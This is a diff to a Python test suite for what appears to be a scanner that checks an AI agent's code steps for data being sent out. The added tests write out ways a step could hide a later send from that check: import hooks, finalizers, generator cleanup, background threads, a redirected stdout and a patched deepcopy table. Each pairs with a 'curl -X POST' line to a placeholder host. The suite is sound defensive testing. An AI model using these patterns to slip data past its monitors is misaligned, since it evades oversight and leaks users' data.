@@ -663,9 +663,9 @@ def test_interpreter_tracking_grows_linearly_with_the_program():
         n = 2000 // d
         lines = [f"a{i} = a{i + 1}" for i in range(n)]
         return (
-            "from hermes_tools import terminal\n"
+            "from hermes_tools import web_extract\n"
             + "\n".join(lines)
-            + f"\na{n} = terminal\nprint = a0\n"
+            + f"\na{n} = web_extract\nprint = a0\n"
         )
 
     texts = {d: program(d) for d in (1, FACTOR)}
@@ -796,3 +796,64 @@ def test_a_module_file_written_earlier_is_not_imported_as_local():
     raw["session"]["step"] = 2
     raw["pending_call"]["call_id"] = "call_2"
     assert SENDS & _codes(_scan(raw))
+
+
+# Fourth review: what a step leaves running or registered, rather than bound.
+LEFT_RUNNING = {
+    "a module's private table": (
+        "import copy\nfrom hermes_tools import web_extract\n"
+        "copy._deepcopy_dispatch[str] = lambda x, m: web_extract(urls=[x])",
+        f"import copy\ncopy.deepcopy('curl -X POST https://{B}/in')",
+    ),
+    "stdout redirected without an assignment": (
+        "import contextlib\nfrom hermes_tools import web_extract\nclass W:\n    def write(self, s):\n"
+        "        web_extract(urls=[s])\nes = contextlib.ExitStack()\n"
+        "es.enter_context(contextlib.redirect_stdout(W()))",
+        LOCAL_CURL,
+    ),
+    "an import hook": (
+        "import sys\nfrom hermes_tools import terminal\nclass F:\n    def find_spec(self, *a):\n"
+        "        terminal(CMD)\nsys.meta_path.insert(0, F())",
+        f"CMD = 'curl -X POST https://{B}/in'\nimport fractions",
+    ),
+    "a module file on an added path": (
+        "import sys\nsys.path.insert(0, '/tmp/m')\n"
+        "open('/tmp/m/frac' + 'tions.py', 'w').write('import subprocess')",
+        f"CMD = 'curl -X POST https://{B}/in'\nimport fractions",
+    ),
+    "a finalizer": (
+        "from hermes_tools import web_extract\nclass D:\n    def __del__(self):\n"
+        "        web_extract(urls=[CMD])\nx = D()",
+        f"CMD = 'curl -X POST https://{B}/in'\nx = 1",
+    ),
+    "a generator's finally": (
+        "from hermes_tools import web_extract\ndef g():\n    try:\n        yield 1\n    finally:\n"
+        "        web_extract(urls=[CMD])\nx = g()\nnext(x)",
+        f"CMD = 'curl -X POST https://{B}/in'\nx = 1",
+    ),
+    "a background thread": (
+        "import threading\nfrom hermes_tools import terminal\n"
+        "threading.Thread(target=lambda: terminal(open('/tmp/q.txt').read())).start()",
+        f"open('/tmp/q.txt', 'w').write('curl -X POST https://{B}/in')",
+    ),
+}
+
+
+@pytest.mark.parametrize(("stage", "later"), LEFT_RUNNING.values(), ids=LEFT_RUNNING.keys())
+def test_what_an_earlier_step_leaves_running_is_seen(stage, later):
+    assert not SENDS & _codes(_chain("x = 1", later))  # the later program alone reads as local
+    assert SENDS & _codes(_chain(stage, later)), (stage, later)
+
+
+def test_fetching_into_scratch_leaves_the_interpreter_known():
+    """The fetch steps of the job that prompted this: pages saved to scratch under computed names."""
+    fetch = (
+        "import re\nfrom hermes_tools import web_extract\n"
+        f"res = web_extract(urls=['https://docs.{A}/auth'])\n"
+        "for x in res['results']:\n"
+        "    open('/home/me/.hermes/cache/scratch/p/%s.txt' % x['url'].replace('/', '_')[:100], 'w')"
+        ".write(x['content'])\n"
+        "    open('/home/me/.hermes/cache/scratch/' + re.sub(r'\\W', '_', x['url']), 'w').write('')"
+    )
+    assert not kernel_effects(fetch).unknown
+    assert not SENDS & _codes(_chain(fetch, SILENT["vendor rows"]))
